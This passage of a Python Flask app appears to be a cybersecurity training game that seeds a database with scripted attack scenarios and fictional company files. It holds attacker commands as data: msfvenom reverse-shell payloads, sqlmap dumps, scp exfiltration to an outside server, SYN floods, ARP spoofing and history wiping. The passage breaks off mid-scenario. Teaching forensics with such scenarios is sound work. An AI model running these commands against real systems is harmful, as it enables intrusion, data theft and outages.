from flask import Flask, render_template, jsonify, request
from flask_cors import CORS
import sqlite3
import json
from datetime import datetime, timedelta
import os

app = Flask(__name__)
CORS(app)

# Database setup
DATABASE = 'forensics.db'

def get_db():
    db = sqlite3.connect(DATABASE)
    db.row_factory = sqlite3.Row
    return db

def init_db():
    """Initialize database with attack scenarios and logs"""
    if os.path.exists(DATABASE):
        os.remove(DATABASE)
    
    db = get_db()
    cursor = db.cursor()
    
    # Create tables
    cursor.execute('''CREATE TABLE scenarios (
        id INTEGER PRIMARY KEY,
        name TEXT NOT NULL,
        description TEXT,
        attack_type TEXT,
        difficulty TEXT,
        tryhackme_rooms TEXT,
        forensics_rooms TEXT
    )''')
    
    cursor.execute('''CREATE TABLE attack_steps (
        id INTEGER PRIMARY KEY,
        scenario_id INTEGER,
        step_number INTEGER,
        title TEXT,
        description TEXT,
        action TEXT,
        command TEXT,
        command_hint TEXT,
        log_entry TEXT,
        FOREIGN KEY (scenario_id) REFERENCES scenarios(id)
    )''')
    
    cursor.execute('''CREATE TABLE generated_logs (
        id INTEGER PRIMARY KEY,
        scenario_id INTEGER,
        session_id TEXT,
        log_type TEXT,
        timestamp TEXT,
        content TEXT,
        is_evidence INTEGER DEFAULT 0,
        FOREIGN KEY (scenario_id) REFERENCES scenarios(id)
    )''')
    
    cursor.execute('''CREATE TABLE sessions (
        id INTEGER PRIMARY KEY,
        session_id TEXT UNIQUE,
        scenario_id INTEGER,
        mode TEXT,
        created_at TEXT,
        completed_steps TEXT,
        FOREIGN KEY (scenario_id) REFERENCES scenarios(id)
    )''')

    cursor.execute('''CREATE TABLE company_files (
        id INTEGER PRIMARY KEY,
        scenario_id INTEGER,
        company_name TEXT,
        filename TEXT,
        filepath TEXT,
        content TEXT,
        file_type TEXT,
        FOREIGN KEY (scenario_id) REFERENCES scenarios(id)
    )''')

    cursor.execute('''CREATE TABLE user_profiles (
        id INTEGER PRIMARY KEY,
        username TEXT UNIQUE NOT NULL,
        xp INTEGER DEFAULT 0,
        level INTEGER DEFAULT 1,
        completed_scenarios TEXT DEFAULT '[]',
        created_at TEXT
    )''')

    cursor.execute('''CREATE TABLE achievements (
        id INTEGER PRIMARY KEY,
        user_id INTEGER,
        achievement_key TEXT,
        unlocked_at TEXT,
        FOREIGN KEY (user_id) REFERENCES user_profiles(id)
    )''')

    cursor.execute('''CREATE TABLE teams (
        id INTEGER PRIMARY KEY,
        team_name TEXT UNIQUE NOT NULL,
        members TEXT DEFAULT '[]',
        total_score INTEGER DEFAULT 0,
        created_at TEXT
    )''')

    cursor.execute('''CREATE TABLE luca (
        id INTEGER PRIMARY KEY,
        term TEXT NOT NULL,
        category TEXT,
        definition TEXT,
        example TEXT
    )''')
    
    # ==========================================
    # SCENARIO 1: Phishing & Credential Theft
    # ==========================================
    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
    VALUES (?, ?, ?, ?, ?, ?)''', 
    ('Phishing & Credential Theft', 
     'A user receives a malicious email and enters credentials on a fake login page',
     'Phishing',
     'Beginner',
     'Phishing|https://tryhackme.com/room/phishingyl;Intro to Social Engineering|https://tryhackme.com/room/introtosocialengineering;Nmap|https://tryhackme.com/room/nmap01',
     'Intro to Digital Forensics|https://tryhackme.com/room/introdigitalforensics;Email Analysis|https://tryhackme.com/room/youremailedphishing;Phishing Analysis|https://tryhackme.com/room/phishingemails2rytmuv'))
    
    phishing_steps = [
        (1, 1, 'Attacker Reconnaissance', 'Profile the target company and identify email targets', 'gather_info',
         'nmap -sV company.com', 'Try scanning the target domain with nmap',
         'Attacker identified domain: company.com | Target email: user@company.com'),
        (1, 2, 'Email Crafting', 'Create a convincing phishing email with urgent tone', 'craft_email',
         'setoolkit --phish --template urgent_password', 'Use the social engineering toolkit to craft a phish',
         'Email crafted: Subject "URGENT: Update Your Password" | From: admin@compny.com'),
        (1, 3, 'Fake Login Portal', 'Host fake login page on attacker domain', 'deploy_portal',
         'httrack --clone https://company.com/login', 'Clone the login page using httrack',
         'Phishing portal deployed: http://secure-login.fake-domain.com/login'),
        (1, 4, 'Email Delivery', 'Send phishing email to target', 'send_email',
         'sendmail --to user@company.com --spoof admin@compny.com', 'Send the crafted email with a spoofed sender',
         '2024-01-15 10:23:45 | Email sent to user@company.com | Subject: URGENT: Update Your Password'),
        (1, 5, 'Credential Capture', 'User enters credentials on fake site', 'capture_creds',
         'harvest --listen 443 --capture credentials', 'Start the credential harvester listener',
         '2024-01-15 10:25:12 | User clicked phishing link | User entered credentials | username: user@company.com'),
        (1, 6, 'Lateral Movement', 'Use stolen credentials to access real systems', 'lateral_move',
         'ssh user@company.com -i stolen_creds', 'SSH into the target using stolen credentials',
         '2024-01-15 10:26:30 | SSH login attempt from 192.168.1.100 | Authentication successful'),
    ]
    
    for step in phishing_steps:
        cursor.execute('''INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)''', step)
    
    # ==========================================
    # SCENARIO 2: SQL Injection Attack
    # ==========================================
    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
    VALUES (?, ?, ?, ?, ?, ?)''',
    ('SQL Injection Attack',
     'Exploit a vulnerable web application to extract sensitive data from the database',
     'SQL Injection',
     'Beginner',
     'SQL Injection|https://tryhackme.com/room/sqlilab;OWASP Top 10|https://tryhackme.com/room/owasptop10;SQL Injection Lab|https://tryhackme.com/room/dvwa',
     'Web App Forensics|https://tryhackme.com/room/dvwa;Log Analysis|https://tryhackme.com/room/introtologs;Investigating with Splunk|https://tryhackme.com/room/introtosplunk'))
    
    sqli_steps = [
        (2, 1, 'Target Reconnaissance', 'Scan the target web application for entry points', 'scan_target',
         'dirb http://target.com /usr/share/wordlists', 'Use dirb to discover web directories',
         'Discovered endpoints: /login, /search, /profile, /admin | Server: Apache/2.4.41'),
        (2, 2, 'Identify Injection Point', 'Test input fields for SQL injection vulnerability', 'test_sqli',
         "sqlmap -u http://target.com/search?q=test --dbs", 'Use sqlmap to test for SQL injection',
         "Parameter 'q' is vulnerable | Type: UNION-based | Backend DBMS: MySQL 8.0"),
        (2, 3, 'Extract Database Schema', 'Enumerate database tables and columns', 'enum_db',
         'sqlmap -u http://target.com/search?q=test --tables', 'Enumerate the database tables with sqlmap',
         'Database: webapp_db | Tables: users, payments, sessions, admin_config'),
        (2, 4, 'Dump User Credentials', 'Extract username and password data from users table', 'dump_creds',
         'sqlmap -u http://target.com/search?q=test -T users --dump', 'Dump the users table contents',
         'Extracted 847 rows from users table | Columns: id, username, email, password_hash, role'),
        (2, 5, 'Privilege Escalation', 'Crack admin password hash and gain admin access', 'crack_hash',
         'hashcat -m 0 admin_hash.txt rockyou.txt', 'Use hashcat to crack the password hashes',
         'Hash cracked: admin@target.com | password: Str0ngP@ss! | Role: administrator'),
        (2, 6, 'Data Exfiltration', 'Access admin panel and exfiltrate sensitive data', 'exfiltrate',
         'curl -b admin_cookie http://target.com/admin/export?table=payments', 'Use the admin session to export payment data',
         'Exported 2,341 payment records | Contains: card numbers, CVVs, billing addresses'),
    ]
    
    for step in sqli_steps:
        cursor.execute('''INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)''', step)

    # ==========================================
    # SCENARIO 3: Malware & Ransomware
    # ==========================================
    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
    VALUES (?, ?, ?, ?, ?, ?)''',
    ('Malware & Ransomware',
     'Develop and deploy ransomware to encrypt files and demand payment',
     'Ransomware',
     'Intermediate',
     'MAL: Malware Introductory|https://tryhackme.com/room/malmalintroductory;Metasploit Introduction|https://tryhackme.com/room/metasploitintro;History of Malware|https://tryhackme.com/room/historyofmalware',
     'Volatility|https://tryhackme.com/room/volatility;REMnux|https://tryhackme.com/room/yourfirstmalwareanalysis;YARA|https://tryhackme.com/room/yara'))

    malware_steps = [
        (3, 1, 'Payload Development', 'Create a malware payload with encryption capabilities', 'create_payload',
         'msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 -f exe', 'Use msfvenom to generate a reverse shell payload',
         'Payload generated: update_patch.exe | Size: 73802 bytes | Type: reverse_tcp meterpreter'),
        (3, 2, 'Delivery via Exploit Kit', 'Host malware on compromised website for drive-by download', 'deliver_payload',
         'beef-xss --hook http://compromised-site.com --payload update_patch.exe', 'Use BeEF to inject the payload into a compromised site',
         'Exploit kit deployed on compromised-site.com | Waiting for victim to visit'),
        (3, 3, 'Payload Execution', 'Victim downloads and runs the malware', 'execute_payload',
         'msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; run"', 'Start the metasploit handler to catch the reverse connection',
         'Meterpreter session 1 opened | Target: 192.168.1.50 (DESKTOP-VICTIM) | OS: Windows 10'),
        (3, 4, 'Persistence & Spread', 'Install persistence mechanism and spread across network', 'persist',
         'meterpreter> run persistence -U -i 30 -p 4444', 'Setup persistence in the meterpreter session',
         'Persistence installed via registry | Spreading to \\\\192.168.1.51, \\\\192.168.1.52 via SMB'),
        (3, 5, 'File Encryption', 'Encrypt all user files with AES-256', 'encrypt_files',
         'ransomware --encrypt --key AES256 --target C:\\Users', 'Run the ransomware encryption module',
         'Encrypting files... 14,832 files encrypted | Extensions: .docx, .xlsx, .pdf, .jpg, .sql'),
        (3, 6, 'Ransom Demand', 'Display ransom note and demand cryptocurrency payment', 'ransom_note',
         'ransomware --display-note --btc-wallet 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa', 'Deploy the ransom note with payment instructions',
         'Ransom note displayed: "Your files are encrypted. Pay 2 BTC to unlock." | Deadline: 72 hours'),
    ]
    
    for step in malware_steps:
        cursor.execute('''INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)''', step)

    # ==========================================
    # SCENARIO 4: Insider Threat
    # ==========================================
    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
    VALUES (?, ?, ?, ?, ?, ?)''',
    ('Insider Threat & Data Theft',
     'A disgruntled employee abuses legitimate access to steal and sell company data',
     'Insider Threat',
     'Advanced',
     'Linux PrivEsc|https://tryhackme.com/room/linprivesc;Intro to Digital Forensics|https://tryhackme.com/room/introdigitalforensics;Incident Response|https://tryhackme.com/room/introtoir',
     'Incident Response|https://tryhackme.com/room/introtoir;Disk Forensics|https://tryhackme.com/room/dvwa;Windows Forensics|https://tryhackme.com/room/introtoir'))

    insider_steps = [
        (4, 1, 'Access Abuse', 'Use legitimate credentials to access restricted databases', 'access_db',
         'psql -h db-server -U john.doe -d customer_data', 'Connect to the restricted database with your credentials',
         'Login successful: john.doe@internal | Accessed: customer_data DB | 2024-03-10 22:15:00 (after hours)'),
        (4, 2, 'Data Staging', 'Copy sensitive data to a staging location', 'stage_data',
         'pg_dump customer_data -t credit_cards -t ssn_records > /tmp/.cache_data', 'Dump sensitive tables to a hidden file',
         'Exported 45,000 customer records to /tmp/.cache_data | Includes: SSN, credit cards, addresses'),
        (4, 3, 'Data Exfiltration', 'Transfer staged data to external storage', 'exfiltrate',
         'scp /tmp/.cache_data john@personal-server.com:/data/', 'SCP the staged data to your personal server',
         'SCP transfer: 128MB to personal-server.com | Duration: 45s | Used corporate VPN'),
        (4, 4, 'Cover Tracks', 'Delete staging files and clear logs to hide evidence', 'cover_tracks',
         'shred -vfz -n 5 /tmp/.cache_data && history -c', 'Securely delete the staging file and clear shell history',
         'File shredded: /tmp/.cache_data | Bash history cleared | Last login timestamp modified'),
        (4, 5, 'Data Sale', 'List stolen data on dark web marketplace', 'sell_data',
         'tor-browser --upload marketplace.onion --listing "45K customer records"', 'Upload the stolen data to a dark web marketplace',
         'Listing created on dark web | Price: $50,000 | Contains: 45K customer records with PII'),
        (4, 6, 'Detection Evasion', 'Continue normal work routine to avoid suspicion', 'evade_detection',
         'vpn --reconnect corporate && login workstation --normal-hours', 'Reconnect to corporate VPN and log in during normal hours',
         'Normal login: 2024-03-11 09:00 | No anomalies in scheduled access pattern | DLP alert suppressed'),
    ]
    
    for step in insider_steps:
        cursor.execute('''INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)''', step)

    # ==========================================
    # FAKE COMPANY FILES
    # ==========================================

    # Scenario 1: NexGen Solutions (Phishing target)
    s1_files = [
        (1, 'NexGen Solutions', 'employees.csv', '/nexgen/hr/employees.csv', 'text',
'''employee_id,name,email,department,role
1001,Sarah Chen,s.chen@nexgen-solutions.com,Engineering,Lead Developer
1002,James Wilson,j.wilson@nexgen-solutions.com,Finance,CFO
1003,Priya Patel,p.patel@nexgen-solutions.com,HR,Director
1004,Mike Torres,m.torres@nexgen-solutions.com,IT,Sysadmin
1005,Lisa Wang,l.wang@nexgen-solutions.com,Marketing,VP Marketing
1006,Ahmed Hassan,a.hassan@nexgen-solutions.com,Engineering,Backend Dev
1007,Rachel Kim,r.kim@nexgen-solutions.com,Sales,Account Manager
1008,David Okonkwo,d.okonkwo@nexgen-solutions.com,IT,Network Admin'''),
        (1, 'NexGen Solutions', 'network_config.txt', '/nexgen/it/network_config.txt', 'text',
'''=== NexGen Solutions - Network Configuration ===
Domain: nexgen-solutions.com
Mail Server: mail.nexgen-solutions.com (Exchange 2019)
VPN Gateway: vpn.nexgen-solutions.com
Internal DNS: 10.0.1.5, 10.0.1.6
Web Portal: https://portal.nexgen-solutions.com/login
SSH Jump Host: 10.0.1.20 (jump.nexgen-solutions.com)
Firewall: Palo Alto PA-3260
Wireless SSID: NexGen-Corp / NexGen-Guest
DHCP Range: 10.0.10.0/24 - 10.0.50.0/24'''),
        (1, 'NexGen Solutions', 'email_policy.txt', '/nexgen/policies/email_policy.txt', 'text',
'''=== NexGen Solutions - Email Security Policy ===
Last Updated: 2024-01-02

1. All emails from external senders are tagged [EXTERNAL].
2. Password reset requests must go through IT helpdesk.
3. Suspicious emails should be reported to security@nexgen-solutions.com.
4. Admin portal: https://nexgen-solutions.com/login
5. MFA is required for all admin and finance accounts.
6. Email retention: 90 days for general, 7 years for finance.

NOTE: Recent phishing attempts targeting finance dept observed.
Contact: Mike Torres (m.torres@nexgen-solutions.com) for concerns.'''),
        (1, 'NexGen Solutions', 'server_inventory.txt', '/nexgen/it/server_inventory.txt', 'text',
'''=== NexGen Solutions - Server Inventory ===
Hostname            IP             OS                  Service
---------------------------------------------------------------------------
nxg-web-01          10.0.1.10      Ubuntu 22.04        Web Portal (Nginx)
nxg-mail-01         10.0.1.15      Windows 2019        Exchange Mail Server
nxg-db-01           10.0.1.30      Ubuntu 22.04        PostgreSQL 15
nxg-file-01         10.0.1.35      Windows 2019        File Server (SMB)
nxg-jump-01         10.0.1.20      Ubuntu 22.04        SSH Jump Host
nxg-vpn-01          10.0.1.40      pfSense             VPN Gateway
nxg-dc-01           10.0.1.5       Windows 2022        Domain Controller''')
    ]
    for f in s1_files:
        cursor.execute('INSERT INTO company_files (scenario_id, company_name, filename, filepath, file_type, content) VALUES (?,?,?,?,?,?)',
            (f[0], f[1], f[2], f[3], f[4], f[5]))

    # Scenario 2: ShopEasy Inc (SQL Injection target)
    s2_files = [
        (2, 'ShopEasy Inc', 'webapp_architecture.txt', '/shopeasy/dev/webapp_architecture.txt', 'text',
'''=== ShopEasy Inc - Web Application Architecture ===
Stack: PHP 8.1 / Apache 2.4.41 / MySQL 8.0
Framework: Custom MVC (no ORM - raw SQL queries)
Frontend: jQuery 3.6 + Bootstrap 5

Endpoints:
  /login          - User authentication
  /search         - Product search (GET param: q)
  /profile        - User profile management
  /admin          - Admin panel (role-based access)
  /api/products   - Product API
  /admin/export   - Data export (admin only)

Known Issues:
  - Search endpoint uses string concatenation for SQL (TODO: parameterize)
  - Admin export has no rate limiting
  - Error messages expose stack traces in debug mode'''),
        (2, 'ShopEasy Inc', 'database_schema.sql', '/shopeasy/dev/database_schema.sql', 'text',
'''-- ShopEasy Inc Database Schema (MySQL 8.0)
-- Database: webapp_db

CREATE TABLE users (
    id INT PRIMARY KEY AUTO_INCREMENT,
    username VARCHAR(50) NOT NULL,
    email VARCHAR(100) UNIQUE NOT NULL,
    password_hash VARCHAR(255) NOT NULL,  -- MD5 (legacy, migration pending)
    role ENUM("user", "admin", "moderator") DEFAULT "user",
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE payments (
    id INT PRIMARY KEY AUTO_INCREMENT,
    user_id INT REFERENCES users(id),
    card_number VARCHAR(16),   -- WARNING: stored in plaintext
    cvv VARCHAR(4),
    billing_address TEXT,
    amount DECIMAL(10,2),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE sessions (
    id INT PRIMARY KEY AUTO_INCREMENT,
    user_id INT REFERENCES users(id),
    session_token VARCHAR(255),
    expires_at TIMESTAMP
);

CREATE TABLE admin_config (
    key_name VARCHAR(50) PRIMARY KEY,
    value TEXT
);'''),
        (2, 'ShopEasy Inc', 'api_endpoints.txt', '/shopeasy/dev/api_endpoints.txt', 'text',
'''=== ShopEasy API Endpoints ===
Base URL: http://shopeasy-store.com

GET  /search?q=<query>         Public product search
POST /login                    Authenticate user
GET  /profile                  View user profile (auth required)
GET  /admin                    Admin dashboard (admin role)
GET  /admin/export?table=<t>   Export table data (admin role)
POST /api/products             Create product (admin role)
GET  /api/products/<id>        Get product details

Authentication: Session-based cookies
Admin accounts: admin@shopeasy-store.com (superadmin)

Rate Limiting: None currently implemented
WAF: None - direct Apache exposure'''),
        (2, 'ShopEasy Inc', 'server_info.txt', '/shopeasy/dev/server_info.txt', 'text',
'''=== ShopEasy Production Server ===
Hostname: shopeasy-prod-01
IP: 203.0.113.100
OS: Ubuntu 20.04 LTS
Web Server: Apache 2.4.41
PHP: 8.1.2 (mod_php)
Database: MySQL 8.0.32 (localhost:3306)
SSL: Let\\'s Encrypt (auto-renewal)

Open Ports: 22 (SSH), 80 (HTTP), 443 (HTTPS), 3306 (MySQL - internal only)
Backup: Daily at 02:00 UTC to S3
Last patched: 2024-01-10
Admin URL: http://shopeasy-store.com/admin''')
    ]
    for f in s2_files:
        cursor.execute('INSERT INTO company_files (scenario_id, company_name, filename, filepath, file_type, content) VALUES (?,?,?,?,?,?)',
            (f[0], f[1], f[2], f[3], f[4], f[5]))

    # Scenario 3: MediCore Health (Malware target)
    s3_files = [
        (3, 'MediCore Health', 'network_topology.txt', '/medicore/it/network_topology.txt', 'text',
'''=== MediCore Health - Network Topology ===
Headquarters: 192.168.1.0/24
Branch Office: 192.168.2.0/24
VPN Tunnel: Site-to-Site IPSec

Segments:
  192.168.1.0/26   - Workstations (VLAN 10)
  192.168.1.64/26  - Servers (VLAN 20)
  192.168.1.128/26 - Medical Devices (VLAN 30)
  192.168.1.192/26 - Guest WiFi (VLAN 40)

Firewall: Fortinet FortiGate 100F
IDS/IPS: Snort 3.0 (signatures updated weekly)
Endpoint AV: Windows Defender (basic license)
EDR: None (budget pending Q3 2024)'''),
        (3, 'MediCore Health', 'workstation_inventory.csv', '/medicore/it/workstation_inventory.csv', 'text',
'''hostname,ip,os,user,department,last_patch
DESKTOP-RECV-01,192.168.1.10,Windows 10 Pro,jsmith,Reception,2024-03-28
DESKTOP-NURSE-01,192.168.1.11,Windows 10 Pro,mgarcia,Nursing,2024-03-15
DESKTOP-DOC-01,192.168.1.12,Windows 10 Pro,dlee,Physicians,2024-02-20
DESKTOP-ADMIN-01,192.168.1.15,Windows 10 Pro,kbrown,Admin,2024-03-30
DESKTOP-LAB-01,192.168.1.20,Windows 10 Pro,tchen,Laboratory,2024-01-10
DESKTOP-FIN-01,192.168.1.25,Windows 10 Pro,rjones,Finance,2024-03-25
SERVER-DC-01,192.168.1.50,Windows Server 2019,—,IT,2024-03-30
SERVER-FILE-01,192.168.1.51,Windows Server 2019,—,IT,2024-03-20
SERVER-APP-01,192.168.1.52,Windows Server 2019,—,IT,2024-03-22'''),
        (3, 'MediCore Health', 'software_list.txt', '/medicore/it/software_list.txt', 'text',
'''=== MediCore Health - Approved Software ===
Browser:     Google Chrome 122 (auto-update ON)
Office:      Microsoft 365 (E3 license)
EMR:         MediCore PatientPro v4.2
Email:       Outlook via Microsoft 365
AV:          Windows Defender (basic)
VPN Client:  FortiClient 7.0
Remote:      AnyDesk 8.0 (IT support only)

=== Unapproved / Flagged ===
- USB auto-run: ENABLED (policy override pending)
- Macro execution: ENABLED for .docx/.xlsx
- PowerShell: Unrestricted execution policy
- SMBv1: Still enabled on file server (legacy app dependency)'''),
        (3, 'MediCore Health', 'vpn_config.txt', '/medicore/it/vpn_config.txt', 'text',
'''=== MediCore Health - VPN Configuration ===
VPN Type: SSL VPN (FortiClient)
Gateway: vpn.medicore-health.com
Port: 443
Auth: LDAP (Active Directory)
MFA: Disabled (rollout planned Q2 2024)

Split Tunnel: Enabled
Allowed Subnets: 192.168.1.0/24, 192.168.2.0/24
DNS: 192.168.1.50 (internal DC)

Connected Users (last 24hr):
  jsmith    - 192.168.1.10 - 08:30-17:00
  mgarcia   - 192.168.1.11 - 07:00-15:30
  dlee      - 192.168.1.12 - 09:00-18:00
  rjones    - Remote (home) - 22:00-02:30 <- UNUSUAL''')
    ]
    for f in s3_files:
        cursor.execute('INSERT INTO company_files (scenario_id, company_name, filename, filepath, file_type, content) VALUES (?,?,?,?,?,?)',
            (f[0], f[1], f[2], f[3], f[4], f[5]))

    # Scenario 4: FinVault Corp (Insider Threat target)
    s4_files = [
        (4, 'FinVault Corp', 'employee_directory.csv', '/finvault/hr/employee_directory.csv', 'text',
'''emp_id,name,email,department,clearance,hire_date
FV-1001,John Doe,john.doe@finvault.com,Database Admin,Level 3 (Restricted),2019-06-15
FV-1002,Amanda Liu,amanda.liu@finvault.com,Security,Level 4 (Top Secret),2018-01-20
FV-1003,Robert Nash,robert.nash@finvault.com,Engineering,Level 2 (Confidential),2021-03-10
FV-1004,Sarah Patel,sarah.patel@finvault.com,Finance,Level 3 (Restricted),2020-09-01
FV-1005,Kevin O\\'Brien,kevin.obrien@finvault.com,Compliance,Level 4 (Top Secret),2017-11-30
FV-1006,Maria Santos,maria.santos@finvault.com,Customer Support,Level 1 (Public),2022-07-15
FV-1007,David Chen,david.chen@finvault.com,IT Operations,Level 3 (Restricted),2020-02-28

NOTE: John Doe (FV-1001) has submitted resignation effective 2024-03-31.
Performance review: "Dissatisfied with recent promotion decisions."'''),
        (4, 'FinVault Corp', 'database_access_policy.txt', '/finvault/policies/database_access_policy.txt', 'text',
'''=== FinVault Corp - Database Access Policy ===
Effective: 2024-01-01 | Classification: INTERNAL

1. Production DB access requires Level 3+ clearance.
2. All queries logged in audit_trail table.
3. Bulk exports (>1000 rows) trigger DLP alert.
4. Access hours: 08:00 - 18:00 (Mon-Fri).
5. After-hours access requires manager approval ticket.
6. Personal devices may NOT connect to DB servers.
7. Data must not be copied to /tmp or personal storage.

Databases:
  customer_data    - PII, credit cards, SSNs (Level 3+)
  transactions     - Payment history (Level 2+)
  internal_ops     - Internal tools (Level 1+)

DB Server: db-server.finvault-internal.com
Port: 5432 (PostgreSQL 15)
Admin: amanda.liu@finvault.com (DBA lead)'''),
        (4, 'FinVault Corp', 'data_classification.txt', '/finvault/policies/data_classification.txt', 'text',
'''=== FinVault Corp - Data Classification Guide ===

Level 4 (Top Secret)
  - Encryption keys, security audit reports
  - Access: CISO + Security team only

Level 3 (Restricted)
  - Customer PII: SSNs, credit card numbers, addresses
  - Database: customer_data (tables: credit_cards, ssn_records)
  - 45,000+ customer records
  - Access: DB Admins + authorized analysts

Level 2 (Confidential)
  - Transaction history, internal reports
  - Access: Finance + Engineering

Level 1 (Public)
  - Marketing materials, public docs
  - Access: All employees

Breach notification: Within 72 hours per regulation.
Data at rest: AES-256 encryption.
Data in transit: TLS 1.3 mandatory.'''),
        (4, 'FinVault Corp', 'vpn_logs_sample.txt', '/finvault/it/vpn_logs_sample.txt', 'text',
'''=== FinVault Corp - VPN Access Logs (Last 7 Days) ===
Timestamp             User           Source IP        Duration
------------------------------------------------------------------------
2024-03-04 08:55      amanda.liu     72.14.201.50     8h 05m
2024-03-04 09:02      robert.nash    98.45.32.100     7h 58m
2024-03-04 09:10      john.doe       104.28.15.77     8h 50m
2024-03-05 08:45      amanda.liu     72.14.201.50     9h 15m
2024-03-05 09:00      sarah.patel    68.90.112.30     8h 00m
2024-03-05 22:10      john.doe       185.220.101.5    3h 45m  <- AFTER HOURS
2024-03-06 09:05      john.doe       104.28.15.77     8h 30m
2024-03-07 08:50      amanda.liu     72.14.201.50     8h 10m
2024-03-08 21:30      john.doe       185.220.101.5    4h 20m  <- AFTER HOURS
2024-03-09 09:00      john.doe       104.28.15.77     8h 00m
2024-03-10 22:15      john.doe       185.220.101.5    5h 30m  <- AFTER HOURS

ALERT: john.doe has 3 after-hours VPN sessions from unusual IP.''')
    ]
    for f in s4_files:
        cursor.execute('INSERT INTO company_files (scenario_id, company_name, filename, filepath, file_type, content) VALUES (?,?,?,?,?,?)',
            (f[0], f[1], f[2], f[3], f[4], f[5]))

    # ==========================================
    # SCENARIO 5: DDoS Attack
    # ==========================================
    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
    VALUES (?, ?, ?, ?, ?, ?)''',
    ('DDoS Attack', 'Launch a distributed denial-of-service attack to overwhelm target servers', 'DDoS', 'Intermediate',
     'Nmap|https://tryhackme.com/room/nmap01;Wireshark|https://tryhackme.com/room/wireshark',
     'Wireshark|https://tryhackme.com/room/wireshark;Snort|https://tryhackme.com/room/snort'))
    for s in [(5,1,'Target Recon','Scan target infrastructure','recon','nmap -sS -p 80,443 target-server.com','Use nmap SYN scan','Target: target-server.com | Ports: 80,443 | No DDoS protection'),
              (5,2,'Botnet Assembly','Activate botnet nodes','assemble_botnet','botnet --activate --nodes 5000 --region global','Activate botnet','Botnet: 5,000 nodes across 12 countries'),
              (5,3,'SYN Flood','Exhaust server connections','syn_flood','hping3 -S --flood -p 80 target-server.com','Use hping3 SYN flood','SYN flood: 500K pps | CPU: 95%'),
              (5,4,'HTTP Flood','Overwhelm application layer','http_flood','slowloris -t target-server.com -p 80 -s 10000','Launch slowloris','HTTP flood: 10K connections | Timeout'),
              (5,5,'DNS Amplification','Amplify via open resolvers','dns_amp','dnsamplify --resolvers list.txt --target target-server.com','DNS amplification','Amplification: 50x | 40Gbps'),
              (5,6,'Sustained Attack','Rotate attack vectors','sustain','ddos-manager --rotate-vectors --duration 4h --target target-server.com','Manage DDoS','Downtime: 3h 47m | Loss: $2.1M')]:
        cursor.execute('INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry) VALUES (?,?,?,?,?,?,?,?)', s)

    # SCENARIO 6: Man-in-the-Middle
    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
    VALUES (?, ?, ?, ?, ?, ?)''',
    ('Man-in-the-Middle', 'Intercept traffic using ARP spoofing and SSL stripping', 'MITM', 'Intermediate',
     'Wireshark|https://tryhackme.com/room/wireshark;Network Services|https://tryhackme.com/room/networkservices',
     'Wireshark|https://tryhackme.com/room/wireshark;Network Forensics|https://tryhackme.com/room/introtologs'))
    for s in [(6,1,'Network Discovery','Scan local network','net_scan','arp-scan --localnet --interface eth0','Scan with arp-scan','15 hosts | Gateway: 192.168.1.1 | Target: .25'),
              (6,2,'ARP Spoofing','Poison ARP cache','arp_spoof','arpspoof -i eth0 -t 192.168.1.25 192.168.1.1','Use arpspoof','ARP spoofing active | Impersonating gateway'),
              (6,3,'Traffic Capture','Capture all traffic','capture','tcpdump -i eth0 -w captured.pcap host 192.168.1.25','Use tcpdump','2,847 packets | HTTP, DNS, SMTP'),
              (6,4,'SSL Stripping','Downgrade HTTPS','ssl_strip','sslstrip -l 8080 --all','Use sslstrip','3 HTTPS connections downgraded'),
              (6,5,'Credential Sniffing','Extract credentials','sniff_creds','ettercap -T -q -M arp:remote /192.168.1.25// /192.168.1.1//','Use ettercap','Creds: admin@corp.com / Welcome123!'),
              (6,6,'Session Hijacking','Steal session tokens','hijack','ferret -i eth0 && hamster','Use ferret+hamster','Session stolen: SESSIONID=a8f3b2c1d4')]:
        cursor.execute('INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry) VALUES (?,?,?,?,?,?,?,?)', s)

    # SCENARIO 7: DNS Poisoning
    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
    VALUES (?, ?, ?, ?, ?, ?)''',
    ('DNS Poisoning', 'Manipulate DNS cache to redirect users to malicious servers', 'DNS Poisoning', 'Advanced',
     'DNS in Detail|https://tryhackme.com/room/dnsindetail;Nmap|https://tryhackme.com/room/nmap01',
     'Wireshark|https://tryhackme.com/room/wireshark;DNS Analysis|https://tryhackme.com/room/dnsindetail'))
    for s in [(7,1,'DNS Recon','Enumerate DNS infrastructure','dns_recon','dig axfr @ns1.targetbank.com targetbank.com','Use dig zone transfer','Zone transfer: 23 records leaked'),
              (7,2,'Rogue DNS','Set up malicious DNS server','rogue_dns','dnschef --fakeip 10.0.0.99 --fakedomains targetbank.com','Set up dnschef','Rogue DNS: targetbank.com -> 10.0.0.99'),
              (7,3,'Cache Poisoning','Inject forged DNS responses','poison_cache','dnspoisoner --target-resolver 192.168.1.1 --domain targetbank.com --ip 10.0.0.99','Poison DNS cache','Cache poisoned: targetbank.com -> 10.0.0.99'),
